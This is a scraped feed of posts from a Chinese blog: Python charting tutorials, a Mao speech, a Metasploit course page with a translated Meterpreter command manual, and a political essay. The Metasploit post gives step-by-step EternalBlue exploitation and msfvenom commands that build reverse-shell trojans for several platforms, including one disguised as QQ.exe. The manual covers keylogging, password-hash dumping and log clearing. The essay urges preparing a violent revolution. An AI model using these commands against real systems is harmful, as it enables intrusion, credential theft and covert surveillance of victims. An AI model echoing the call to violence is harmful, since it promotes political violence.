open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() dict = json.loads(data) js_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;][1][\u0026#39;children\u0026#39;] data_list=[] for js_data in js_list: js_name = js_data[\u0026#39;name\u0026#39;] js_confirm = js_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((js_name,js_confirm)) map = Map() map.add(\u0026#39;江苏确诊情况\u0026#39;,data_list,\u0026#39;江苏\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) map.render() 成果展示：\n","date":"2025-12-03T18:25:08+08:00","permalink":"https://www.retr0.xyz/p/10.4-%E7%BB%83%E4%B9%A0%E4%BA%8C%E5%9C%B0%E5%9B%BE/","title":"10.4 练习二：地图"},{"content":" 本篇课程如未特别解释均使用 Kali 虚拟机进行\nMSF的了解 msf（全称 metasploit）是一款功能强大的攻击框架框架\n现在我们打开msf\n启动 Kali，在终端中输入msfconsole打开msf\nmsf中集成了很多工具，例如你可以调用nmapnmap -sV [目标ip]\n实验部分 msf使用漏洞进行攻击 这里以漏洞：永恒之蓝 ms17_010为例\n前置知识： msf如果使用漏洞去攻击对方，需要的条件：\n漏洞 攻击载荷（木马、病毒） STEP1 利用漏洞进入目标计算机 1 2 3 4 use exploit/windows/smb/ms17_010_eternalblue\t选择要使用的漏洞 show options\t查看使用要求 set rhosts [目标ip]\trun或者exploit 返回了以下内容说明漏洞已经利用成功:\tWIN!\nSTEP2 执行命令 这时发现控制台的指令前缀已经从msf \u0026gt;变成了metepreter \u0026gt;我们可以敲一个help看看有什么指令可用\n这边举例几个常用指令：\ngetuid\t查看当前控制的用户账户权限\nshell\t打开目标的终端\n其他命令可以参考这篇文章：Meterpreter 命令手册（中文）\n退出连接输入\texit\n另外如果想要暂时断开（挂起）连接可以使用：background命令\n这时当前连接就会被保存为名称为session 的任务，其中为数字，例如session 1\nsessions\t查看控制了多少人\n过会要重新连接时可以输入sessions -i 1即可\n基于木马程序的msf内网渗透 服务端准备 现在我们要用msf生成 32位 木马程序，执行下面的命令：\n1 2 cd Desktop/\t方便找到exe文件 msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[控制端ip] lport=[端口号] -f exe \u0026gt; 文件名.exe 现在我们生成的是用于服务端的文件，接下来我们开始配置控制端\n补充：生成64位木马命令\n1 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f exe -o 文件名.exe 控制端准备 msfconsole\t打开msf控制台\n1 2 3 4 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp\tpayload后的内容要与上面-p后面的内容一致 set lhost [控制端ip] run或者Sexploit 现在开始如果有目标打开了木马程序就会自动连接到被控端：\n其他类型木马 生成Mac木马（32位旧版）\n1 msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=[控制端ip] lport=[端口号] -f macho -p 文件名.macho 生成安卓木马（旧版，需要数字签名）\n1 msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f apk -o 文件名.apk 生成power shell木马（raw表示生成代码，不是程序）\n1 msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp lhost=[控制端ip] lport=[端口号] -e cmd/powershell_base64 -i 3 -f raw -o msf.ps1 生成Linux木马\n1 msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f elf -o 文件名.elf 生成python木马\n1 msfvenom -p python/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f raw -o 文件名.py meterpreter操作补充 提权 方法一：直接提权\ngetsystem\t直接提权（有风险，可能报错）\n方法二：通过ask模块提权\n若当前已经进入meterpreter \u0026gt; 控制台：\n1 2 3 background\t挂起连接 use exploit/windows/local/ask\t加载ask模块 info\t查看信息 查看到需要指定目标的session号码，所以使用sessions查询（以session 1为例）\n1 2 3 set session 1 set filename QQ.exe 此处填伪装的文件名，以qq为例 run 方法三：UAC绕过提权（成功率不高，仅限32位系统）\n1 2 3 4 use exploit/windows/local/bypassuac show options set session [编号] run 之后会反弹一个新的session，进入这个新的session\n","date":"2025-12-02T18:33:10+08:00","permalink":"https://www.retr0.xyz/p/1.7-msf%E6%A1%86%E6%9E%B6%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/","title":"1.7 MSF框架以及使用"},{"content":"核心命令（Core Commands） 命令 描述 ? 帮助菜单 background 将当前会话转入后台 bg background 的别名 bgkill 终止后台运行的 Meterpreter 脚本 bglist 列出所有运行中的后台脚本 bgrun 以后台线程模式执行 Meterpreter 脚本 channel 显示或控制活跃的通道信息 close 关闭通道 detach 分离 Meterpreter 会话（适用于 http/https 传输） disable_unicode_encoding 禁用 Unicode 字符串编码 enable_unicode_encoding 启用 Unicode 字符串编码 exit 终止 Meterpreter 会话 get_timeouts 获取当前会话的超时时间配置 guid 获取会话的 GUID（全局唯一标识符） help 帮助菜单 info 显示 Post 模块的详细信息 irb 在当前会话中打开交互式 Ruby shell load 加载一个或多个 Meterpreter 扩展模块 machine_id 获取会话关联主机的 MSF 标识符 migrate 将 Meterpreter 服务端迁移到其他进程 pivot 管理跳板监听（内网穿透相关） pry 在当前会话中打开 Pry 调试器 quit 终止 Meterpreter 会话（同 exit） read 从通道读取数据 resource 执行文件中存储的命令序列 run 执行 Meterpreter 脚本或 Post 模块 secure （重新）协商会话的 TLV 数据包加密 sessions 快速切换到另一个会话 set_timeouts 设置当前会话的超时时间配置 sleep 强制 Meterpreter 静默，之后重新建立会话 ssl_verify 修改 SSL 证书验证设置 transport 管理会话传输机制（如 http/https/tcp） use \u0026ldquo;load\u0026rdquo; 的废弃别名（不推荐使用） uuid 获取当前会话的 UUID（通用唯一标识符） write 向通道写入数据 脱钩命令（Unhook Commands） 命令 描述 unhook_pe 解除当前进程的钩子（对抗反病毒检测） 权限提升命令（Priv: Elevate Commands） 命令 描述 getsystem 尝试将权限提升至本地系统权限（SYSTEM） 密码数据库命令（Priv: Password database Commands） 命令 描述 hashdump 导出 SAM 数据库内容（获取系统哈希值） 时间戳篡改命令（Priv: Timestomp Commands） 命令 描述 timestomp 操纵文件的 MACE 属性（修改创建/访问/修改时间） 文件系统命令（Stdapi: File system Commands） 命令 描述 cat 读取文件内容并显示到屏幕 cd 切换目录 checksum 获取文件的校验和（如 MD5/SHA） cp 复制源文件到目标路径 del 删除指定文件 dir 列出文件（ls 的别名） download 下载文件或目录到本地 edit 编辑文件 getlwd 显示本地工作目录（lpwd 的别名） getwd 显示远程工作目录 lcat 读取本地文件内容并显示到屏幕 lcd 切换本地工作目录 ldir 列出本地文件（lls 的别名） lls 列出本地文件 lmkdir 在本地创建新目录 lpwd 显示本地工作目录 ls 列出远程文件 mkdir 在远程创建新目录 mv 移动/重命名文件/目录 pwd 显示远程工作目录（同 getwd） rm 删除指定文件（同 del） rmdir 删除目录 search 搜索远程文件 show_mount 列出所有挂载点/逻辑驱动器 upload 上传本地文件或目录到远程 网络命令（Stdapi: Networking Commands） 命令 描述 arp 显示主机的 ARP 缓存表 getproxy 显示当前代理配置 ifconfig 显示网络接口信息（类 Unix 系统） ipconfig 显示网络接口信息（Windows 系统） netstat 显示网络连接状态（TCP/UDP 端口） portfwd 将本地端口转发到远程服务（端口转发） resolve 在目标主机上解析主机名（DNS 查询） route 查看和修改路由表 系统命令（Stdapi: System Commands） 命令 描述 clearev 清除系统事件日志 drop_token 放弃当前活跃的模拟令牌 execute 执行系统命令 getenv 获取一个或多个环境变量的值 getpid 获取当前 Meterpreter 进程 ID getprivs 尝试启用当前进程可用的所有权限 getsid 获取 Meterpreter 服务端运行用户的 SID getuid 获取 Meterpreter 服务端运行的用户名 kill 终止指定进程 localtime 显示目标系统的本地日期和时间 pgrep 按进程名过滤进程 pkill 按进程名终止进程 ps 列出所有运行中的进程 reboot 重启远程计算机 reg 操作远程注册表（查询/修改/删除键值） rev2self 在远程主机上调用 RevertToSelf()（放弃模拟身份） shell 获取系统命令行 shell（如 cmd/bash） shutdown 关闭远程计算机 steal_token 尝试从目标进程窃取模拟令牌（权限窃取） suspend 暂停或恢复指定进程 sysinfo 获取远程系统信息（如操作系统版本、硬件配置） 用户界面命令（Stdapi: User interface Commands） 命令 描述 enumdesktops 列出所有可访问的桌面和窗口站 getdesktop 获取当前 Meterpreter 附着的桌面 idletime 返回远程用户的空闲时间（秒） keyboard_send 发送键盘输入（模拟按键） keyevent 发送键盘事件（如按下/释放快捷键） keyscan_dump 导出键盘记录缓存（获取已捕获的按键） keyscan_start 开始捕获键盘输入（键盘记录） keyscan_stop 停止捕获键盘输入 mouse 发送鼠标事件（模拟点击/移动） screenshare 实时监控远程用户桌面 screenshot 截取交互式桌面的屏幕截图 setdesktop 切换 Meterpreter 当前附着的桌面 uictl 控制部分用户界面组件（如禁用键盘/鼠标） 摄像头命令（Stdapi: Webcam Commands） 命令 描述 record_mic 从默认麦克风录制 X 秒音频 webcam_chat 启动视频聊天（需远程主机支持） webcam_list 列出所有可用的摄像头 webcam_snap 从指定摄像头拍摄快照（拍照） webcam_stream 播放指定摄像头的实时视频流 音频输出命令（Stdapi: Audio Output Commands） 命令 描述 play 在目标系统上播放波形音频文件（.wav 格式） 补充说明 术语规范： 保持网络安全领域通用译法（如 hashdump 译为“导出 SAM 数据库”而非字面翻译，pivot 译为“跳板监听”符合内网渗透场景） 保留命令原文（如 meterpreter、TLV、SID 等专有名词不翻译） 区分本地/远程操作（前缀 l 表示本地，如 lcd=本地切换目录，cd=远程切换目录） 使用提示： 如需查看某个命令的详细用法，执行 \u0026lt;命令\u0026gt; -h 或 help \u0026lt;命令\u0026gt;（例：portfwd -h） 部分命令依赖系统环境（如 ifconfig 适用于 Linux/Mac，ipconfig 适用于 Windows） 权限相关命令（如 getsystem、hashdump）需要管理员权限才能正常执行 ","date":"2025-12-02T16:59:31+08:00","permalink":"https://www.retr0.xyz/p/meterpreter-%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C%E4%B8%AD%E6%96%87/","title":"Meterpreter 命令手册（中文）"},{"content":" *这是毛泽东同志在一九五三年夏季全国财经工作会议上的讲话。\n（一九五三年八月十二日）\n​\t这次会议开得很好，周总理的结论也作得好。\n​\t现在我们可以看出，在“三反”“五反”运动之后，党内有两种性质的错误。一种是一般性的错误，如“五多”，大家都可能犯，什么时候都可能犯。“五多”的错误也可以变成“五少”的错误。另一种是原则性的错误，如资本主义倾向。这是资产阶级思想在党内的反映，是违背马克思列宁主义的立场问题。\n​\t“三反”“五反”运动，是对党内资产阶级思想的很大打击。但是，当时仅仅给了贪污浪费这方面的资产阶级思想以基本打击，而对在路线问题上反映出来的资产阶级思想并没有解决。这种资产阶级思想，不仅财经工作中有，而且政法、文教和其他工作中也有，中央同志中和地方同志中都有。\n​\t对于财经工作中的错误，从去年十二月薄一波同志提出“公私一律平等”的新税制开始，到这次会议，都给了严肃的批评。新税制发展下去，势必离开马克思列宁主义，离开党在过渡时期的总路线，向资本主义发展。\n​\t过渡时期,是向社会主义发展,还是向资本主义发展？按照党的总路线，是要过渡到社会主义。这是要经过相当长期的斗争的。新税制的错误跟张子善^[1]^的问题不同，是思想问题，是离开了党的总路线的问题。要在党内开展反对资产阶级思想的斗争。就思想状况来说，党内有三种人：有的同志是坚定的,没有动摇的,是马克思列宁主义思想；有一部分同志，基本上是马克思列宁主义，但夹杂着一些非马克思列宁主义的思想；少数人是不好的，是非马克思列宁主义思想。在对薄一波错误思想的批判中,有人说,薄一波的错误是小资产阶级个人主义，这是不妥当的。主要应当批判他有利于资本主义，不利于社会主义的资产阶级思想。这样的批判才是对的。我们说过，“左”倾机会主义错误,是小资产阶级狂热性在党内的反映,那是在和资产阶级决裂时期发生的。在和资产阶级合作的三个时期,就是第一次国共合作时期、抗日战争时期和目前这个时期,都是资产阶级思想影响了党内一部分人，他们动摇了。薄一波的错误,就是在这种情况下犯的。\n注释[1]张子善，曾担任中共天津地委书记，由于受资产阶级腐蚀，堕落成为大贪污犯，在“三反”运动中被判处死刑。\n​\t薄一波的错误，并不是孤立的，不仅在中央有，在大区和省市两级也有。各大区和省市要开一次会，根据七届二中全会的决议和这次会议的结论，检查自己的工作，借以教育干部。\n​\t最近，我去武汉、南京走了一趟,知道了很多情况,很有益处。我在北京,差不多听不到什么,以后还要出外走走。中央领导机关是一个制造思想产品的工厂,如果不了解下情,没有原料，也没有半成品，怎么能够制造出产品？有的东西，地方上已经制成成品，中央领导机关就可以在全国加以推广。比如老“三反”和新“三反”^[2]^，都是地方上先搞的。中央各部乱发指示。本来中央各部发出的东西,应当是上品,现在是次品,并且有大量产品根本没有使用价值,大批报废。大区和省市的领导机关,是制造思想产品的地方工厂,也要出上品。\n注释[2]老“三反”，指一九五一年开展的反对贪污、反对浪费、反对官僚主义的斗争。新“三反”，指一九五三年开展的反对官僚主义、反对命令主义、反对违法乱纪的斗争。\n​\t薄一波的错误，是资产阶级思想的反映。它有利于资本主义，不利于社会主义和半社会主义，违背了七届二中全会的决议。\n​\t我们依靠谁？是依靠工人阶级，还是依靠资产阶级？七届二中全会的决议早已讲清楚了：“必须全心全意地依靠工人阶级”。决议还说，在恢复和发展生产的问题上，必须确定：国营工业生产第一，私营工业生产第二，手工业生产第三。重点是工业，工业中的重点是重工业，这是国营的。在我国目前的五种经济成份中，国营经济是领导成份。资本主义工商业要逐渐引向国家资本主义。\n​\t二中全会决议讲，在发展生产的基础上，改善工人和劳动人民的生活。有资产阶级思想的人，不注意这一点，薄一波就是代表。我们的重点必须放在发展生产上，但发展生产和改善人民生活二者必须兼顾。福利不可不谋，不可多谋，不谋不行。现在，不顾人民生活，不顾人民死活的干部还不少。贵州有一个团曾经占了农民的大量田地，这是严重侵犯人民利益的行为。不顾人民生活是不对的，但是重点还是要放在生产建设上。\n​\t关于利用、限制和改造资本主义经济的问题，二中全会也讲得很清楚。决议上说,对私人资本主义经济,要从活动范围、税收政策、市场价格、劳动条件等方面加以限制,不能任其泛滥。社会主义经济和资本主义经济是领导和被领导的关系。限制和反限制，是新民主主义国家内部阶级斗争的主要形式。现在，新税制讲“公私一律平等”，这就违背了国营经济是领导成份的路线。\n​\t关于个体的农业经济和手工业经济实行合作化的问题，二中全会决议分明说：“这种合作社是以私有制为基础的在无产阶级领导的国家政权管理之下的劳动人民群众的集体经济组织。中国人民的文化落后和没有合作社传统，使得我们的合作社运动的推广和发展大感困难；但是可以组织，必须组织，必须推广和发展。单有国营经济而没有合作社经济，我们就不可能领导劳动人民的个体经济逐步地走上集体化，就不可能由新民主主义国家发展到将来的社会主义国家，就不可能巩固无产阶级在国家政权中的领导权。”这是一九四九年三月的决议，但是相当多的同志不注意,当作新闻,其实是旧闻。薄一波写了《加强党在农村中的政治工作》的文章，他说：个体农民经过互助合作到集体化的道路，“是一种完全的空想,因为目前的互助组是以个体经济为基础的,它不能在这样的基础上逐渐发展到集体农场，更不能经由这样的道路在全体规模上使农业集体化。”这是违反党的决议的。\n​\t现在有两种统一战线,两种联盟。一种是工人阶级和农民的联盟,这是基础。一种是工人阶级和民族资产阶级的联盟。农民是劳动者,不是剥削者,工人阶级和农民的联盟是长期的。但是,工人阶级和农民是有矛盾的。我们应当按照自愿的原则,把农民由个体所有制逐步引导到集体所有制。将来国有制和集体所有制也是有矛盾的。这都是非对抗性的矛盾。工人阶级和资产阶级的矛盾，是对抗性的矛盾。\n​\t资产阶级一定要腐蚀人，用糖衣炮弹打人。资产阶级的糖衣炮弹，有物质的，也有精神的。精神的糖衣炮弹打中了一个靶子，就是薄一波。他的错误，是受了资产阶级思想的影响。宣传新税制的社论，资产阶级拍掌，薄一波高兴了。关于新税制，他事先征求了资产阶级的意见，和资产阶级订了君子协定，却没有向中央报告。当时商业部、供销合作总社不赞成，轻工业部也不满意。财经贸易系统的一百一十万干部和职工，绝大多数是好的，有少数人是不好的。这些不好的人又可以分为两部分：一部分是反革命分子，应当清除；一部分是犯错误的革命者，包括党员和非党工作人员，应当用批评教育的方法来改造他们。\n​\t为了保证社会主义事业的成功，必须在全党，首先在中央、大区和省市这三级党政军民领导机关中，反对右倾机会主义的错误倾向，即反对党内的资产阶级思想。各大区和省市要在适当时机召集有地委书记、专员参加的会议，展开批评讨论，讲清楚社会主义道路和资本主义道路的问题。\n​\t为了保证社会主义事业的成功，必须实行集体领导，反对分散主义，反对主观主义。\n​\t我们现在要反对主观主义,既反对盲目冒进的主观主义,也反对保守的主观主义。过去,在新民主主义革命时期,犯过主观主义的错误,有右的也有“左”的。陈独秀、张国焘是右的,王明是先“左”后右。延安整风的时候,集中反了教条主义,附带反了经验主义,二者都是主观主义。理论与实际不结合,革命就不能胜利。整风解决了这个问题。我们采取惩前毖后、治病救人的方针，是正确的。这次对薄一波实行坚决的彻底的批评，是为了使犯错误的人改正错误，为了保证社会主义的胜利进行。现在是社会主义革命时期，也有主观主义。急躁冒进或保守,都是不按实际情况办事,都是主观主义。不反掉主观主义，革命和建设就不会成功。民主革命时期，对主观主义的错误,用整风的办法解决了,团结了全党执行正确路线的同志和犯过错误的同志,大家从延安出发,奔赴各个战场,全党一个劲,取得了全国胜利。现在,干部比较成熟了，水平提高了,希望不要用很长的时期,基本上把领导工作中的主观主义反掉，努力使主观与客观相适合。\n​\t所有这些问题的解决,关键是巩固集体领导,反对分散主义。我们历来是反对分散主义的。一九四一年二月二日,中央给各中央局、各将领发出指示,规定凡有全国意义的通电、宣言和对内指示,必须事先请示中央。五月间,中央发布了关于统一各根据地对外宣传的指示。同年七月一日，在纪念党成立二十周年的时候,中央发布了关于增强党性的决定,着重反对分散主义。一九四八年,中央发的反对分散主义的指示更多了。一月七日，中央发出了关于建立报告制度的指示；三月，又发了补充指示。同年九月,政治局会议作了关于向中央请示报告制度的决议。九月二十日,中央作了关于健全党委制的决定。一九五三年三月十日,为了避免政府各部门脱离党中央领导的危险,中央作了关于加强对政府工作领导的决定。\n​\t集中与分散是经常矛盾的。进城以来,分散主义有发展。为了解决这个矛盾,一切主要的和重要的问题,都要先由党委讨论决定,再由政府执行。比如,在天安门建立人民英雄纪念碑，拆除北京城墙这些大问题,就是经中央决定，由政府执行的。次要的问题,可以由政府部门的党组去办,一切问题都由中央包下来就不行。反对分散主义,是最得人心的,因为党内大多数同志是关心集体领导的。对待集体领导的态度,党内有三种人：第一种人关心集体领导。第二种人不甚关心,认为党委对他最好不管，管也可以。“最好不管”是缺乏党性，“管也可以”是还有党性。我们要抓他“管也可以”，对缺乏党性要说服教育。不然，各部都各搞各的,中央管不了各部,部长管不了司局长,处长管不了科长,谁也管不了谁,于是王国甚多，八百诸侯。第三种人是极少数，他们坚决反对集体领导。认为最好永远不管。在关于增强党性的决定中,强调要严格实行民主集中制的纪律,少数服从多数,个人服从组织,下级服从上级,全党服从中央（这是多数服从少数,这个少数是代表多数的）。有意见请提,破坏党的团结是最没有脸的。只有靠集体的政治经验和集体的智慧，才能保证党和国家的正确领导，保证党的队伍的不可动摇的团结一致。\n​\t在这次会议上,刘少奇说有那么一点错误,小平同志也说有那么一点错误。无论任何人,犯了错误都要检讨,都要受党的监督,受各级党委的领导,这是完成党的任务的主要条件。全国有很多人,是靠无政府状态吃饭。薄一波就是这样的人。他在政治上思想上有些腐化,批评他是完全必要的。\n​\t最后一点，要提倡谦虚、学习和坚忍的精神。\n​\t要坚忍。如抗美援朝,我们打痛了美帝国主义,打得它相当怕。这对我们建设有利,是我们建设的重要条件。最重要的是,我们的军队受到了锻炼，兵勇、干智。当然，我们牺牲了人,用了钱,付出了代价。但是我们就是不怕牺牲，不干则已，一干就干到底。胡宗南进攻陕甘宁边区，我们的县城只剩下一个,但我们并没有退出边区,吃树叶就吃树叶,就是要有一股狠劲。\n​\t要学习,不要骄傲,不能看不起人。鹅蛋看不起鸡蛋,黑色金属看不起稀有金属,这种看不起人的态度是不科学的。中国是大国,党是大党,也没有理由看不起小国小党。对兄弟国家人民要永远保持学习的态度,要有真正的国际主义精神。在对外贸易方面,有些人骄傲,妄自尊大,这是不对的。要在全党特别要在出国人员中进行教育。要苦学苦干,在十五年或者更长的时间内,基本上完成社会主义工业化和社会主义改造。那时,我国强大了,也要谦虚,永远保持学习的态度。\n​\t七届二中全会有几条规定没有写在决议里面。一曰不作寿。作寿不会使人长寿。主要是要把工作做好。二曰不送礼。至少党内不要送。三曰少敬酒。一定场合可以。四曰少拍掌。不要禁止，出于群众热情，也不泼冷水。五曰不以人名作地名。六曰不要把中国同志和马、恩、列、斯平列。这是学生和先生的关系，应当如此。遵守这些规定，就是谦虚态度。\n​\t总之，要坚持谦虚、学习和坚忍的精神，坚持集体领导的制度，完成社会主义的改造，达到社会主义的胜利。\n选自《毛泽东选集 第五卷》1977年4月第1版 第90页\n","date":"2025-12-01T13:59:29+08:00","permalink":"https://www.retr0.xyz/p/%E5%8F%8D%E5%AF%B9%E5%85%9A%E5%86%85%E7%9A%84%E8%B5%84%E4%BA%A7%E9%98%B6%E7%BA%A7%E6%80%9D%E6%83%B3/","title":"反对党内的资产阶级思想*"},{"content":"编者按：\n1、经常能在网上看到“毒品作为导致近代中华民族身体素质减弱、巨额财富流失和沦为半殖民地半封建社会的毒源”、“中国人把禁毒刻在基因里”等言论来鼓吹民族主义、抹杀背后的阶级矛盾，此次事件中，群众对于假禁毒、真专政行为表示不满，自发性的去声援、关注“发声者”的帐号。\n2、“黄赌毒”等风气的产生不是因为别的，就是因为私有制。这不是靠美帝说的那样靠“发展生产力步入共产主义消灭不良风气”这么“励志”、“天真”就能解决的事情。正是因为存在私人发财的土壤，存在可以剥削残害他人以谋求利益的土壤，毒品才会泛滥成灾。不毁灭私有制，家破人亡的悲剧永远无法彻底得到终结！那些缉毒警察的牺牲永远是白费！无产阶级要看清现实，准备暴力革命推翻现今世界的资本主义制度，在马列毛主义的领导下用无产阶级专政代替它。\n11月27日晚，抖音号“兵团戒毒”发布视频科普2026年1月1日起新规规定吸毒者档案封存，任何单位和个人无权查询。后在半夜时分，“南通文旅”的官方抖音号在该视频评论区评论道：“哪位少爷吸了？”此事迅速引爆全网，南通文旅的官方抖音号粉丝量持续暴涨四百万。28日，兵团戒毒账号删除该视频并且其他视频评论已精选，南通文旅已设置评论区仅作者可评论，仅有共创视频评论区无法设置权限。\n南通文旅的这则可谓是针锋相对的回复，则是将这件事的热度进一步上升。这句话当然不可能是文旅官方的意思，毕竟同属官僚体系，实则是一损俱损的，面对中央的这些个民生载道的法律法规，地方政府就算是获益不大，也绝对不可能敢于与中央政府唱反调。因此，这一评论大概率是运营人员自己的评论。此事发酵到如此程度，整个账号的运营团队估计都没什么好下场。之后，多起地方文旅也是趁机捞取热度，发布一些禁毒向视频打“擦边球”。\n这如此火爆的事件是有很耐人寻味的。首先是这一隐藏档案的规定，无不是将资产阶级的丑恶嘴脸暴露无遗。毒品的危害是巨大的，它能够轻松从生理上彻底摧毁一条生命。英帝用它来打开清朝的封闭市场，荼毒了几代无数半殖民地中国的群众；金三角地带至今都是毒品泛滥的重灾区；墨西哥毒贩的“威名”更是响彻全球，连墨西哥政府都要退避三舍…毒品带来的灾害如此巨大，为什么依然能够长期存在永不杜绝呢？究其根本，是在资本主义私有制社会下，资产阶级对于毒品所带来的巨大利润无法抗拒。\n美帝的喉舌经常以此来贬低美西方帝国主义，转移矛盾抬高美帝，鼓吹美帝的禁毒力度有多么大，如今可算是自己打自己脸了——美帝这是演都不演了。事实上，美帝禁毒力度再大也只是政治权衡下的表面文章：如果说一般的通过私有制劳动关系的剥削是可持续性的竭泽而渔，还会维持再生产，那么毒品就像是一次性掠夺干净无产阶级的剩余价值。资产阶级不傻，不会让其泛滥成灾，遍及全社会，资产阶级本身就是依附于无产阶级而存在的，更可况毒品是群众中的禁忌。但正如前文所说：毒品所带来的巨额利润是资产阶级所不能抗拒的，这就注定了毒品在资本主义社会中不可能完全杜绝。**有利润就有资本，有资本就会有市场，资本家有无数种手段让人去“自愿”消费购买毒品。**毒品从种植、生产到倾销，哪一个环节不是需要严密的组织来执行呢？现实生活中由无数的黑社会、豪强承担这一职责，而其与美帝政府本身就是紧密相连的。\n至于无数牺牲的缉毒警察，大多也是无产阶级和小资产阶级的子女，他们所承受的扭曲逼仄的普通生活、时时刻刻担心自身与家人生命的危机，又与资产阶级有什么关系呢？资产阶级自持专政权，往往只需要学会怎么依靠自身的生产资料、权势地位来压迫、统治无产阶级就行了。因此美帝颁布这项法规，实则是极为正常的。再多的缉毒警擦也不可能杜绝毒品的肆虐横行，因为祸根脱不开资本主义。\n反观新中国，成立之后短短几年就在全国范围内解决毒品问题，享誉“世界无毒国”的美名，甚至帮助数百万受毒品璀璨的人通过劳动与政治挂帅的改造解决毒品危害。正是改革开放后，无产阶级再次失去了专政权，黄赌毒再一次肆虐。\n不论是南通文旅运营团队中说出这句话的人，还是网上无数舆论声援的网友，实际上都说明了群众对于美帝愈发的不满，可以说无产阶级对资产阶级的怒火早已愈烧俞烈。但资本主义社会之下，无产阶级的怒火也只会导向自发的经济斗争，例如佳士运动，最终的结果是不可能对美帝的国家机器造成什么实质性的伤害。\n","date":"2025-12-01T09:52:45+08:00","image":"https://www.retr0.xyz/post/%E9%9A%8F%E7%AC%94/img/1.2-0.jpg","permalink":"https://www.retr0.xyz/p/%E5%90%B8%E6%AF%92%E6%A1%A3%E6%A1%88%E5%B0%81%E5%AD%98--%E8%B5%84%E6%9C%AC%E4%B8%BB%E4%B9%89%E7%A4%BE%E4%BC%9A%E7%9A%84%E6%97%A0%E4%BA%A7%E9%98%B6%E7%BA%A7%E7%BE%A4%E4%BC%97%E5%87%BA%E8%B7%AF%E4%BD%95%E5%9C%A8/","title":"吸毒档案封存--资本主义社会的无产阶级群众出路何在"},{"content":"数据准备 资料获取 接下来的几个练习所用数据都在这里，请自行下载：\n链接: https://pan.baidu.com/s/1b5ZZ5cVyS-9_06tql4tNFw 提取码: i3i6\n分析文件 我们任选一个文件打开分析（此处以美国.txt为例）\n文件大致为jsonp_1629344292311_69436({\u0026quot;status\u0026quot;:0,\u0026quot;msg\u0026quot;:\u0026quot;success\u0026quot; 。。。。。。32695,271457,169842]}]}}]});\n发现此文件内容并不完全符合json格式，存在以下两点问题：\n开头的花括号前多出来了jsonp_1629344292311_69436(部分 结尾多了出了括号和分号); 接下来为例便于查看json的层级结构，我们打开工具网站：JSON在线视图查看器(Online JSON Viewer)将上面文本中间去头去尾符合正确json格式的部分复制到左面的输入框，点击格式化按钮，这时右面已经出现了便于查看的结构树，如图：\n也可以参考下面给出的省略版：\n总体可以看出其中，\u0026ldquo;update\u0026quot;中和下面的\u0026quot;data\u0026quot;中的数据应该具有对应关系\n开始操作 为了方便演示，将三个国家分开操作，因此可以将任务总共分为下面几步：\n打开并读取文件 去掉不合json规范的开头 去掉不合json规范的结尾 json转python字典 获取trend key 获取日期数据，用于x轴，取2020年（到314下标结束） 获取确诊数据，用于y轴，取2020年（到314下标结束） 生成图表 分块演示 以美国.txt为例。\n1 2 3 # 打开并读取文件 usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() 打开美国.txt文件查看发现开头要删除的内容为：jsonp_1629344292311_69436(\n根据前面所学的6.3 数据容器：字符串中2.2 节字符串的替换，我们这里使用replace()函数处理\n1 us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) 接下来的结尾不能也用replace()，因为在文件中可能有多处出现了);，会出现多处替换的情况，因此我们使用字符串的切片，详见6.4 序列的操作：切片\n1 us_data = us_data[:-2] 下面导入json模块将字符串转为字典\n1 2 import json us_dict = json.loads(us_data) 下面回到浏览器，根据json视图一点点获取层级数据\n1 us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] 目前剩下的结构\n1 2 3 JSON ├─list(字典，格式为0:\u0026#34;2.22\u0026#34;,1:\u0026#34;2.23\u0026#34;) └─updateDate 下面我们获取日期数据\n1 us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] 然后获取确诊数据\n1 us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] 最后构建图表\n1 2 3 4 5 6 7 8 9 10 # 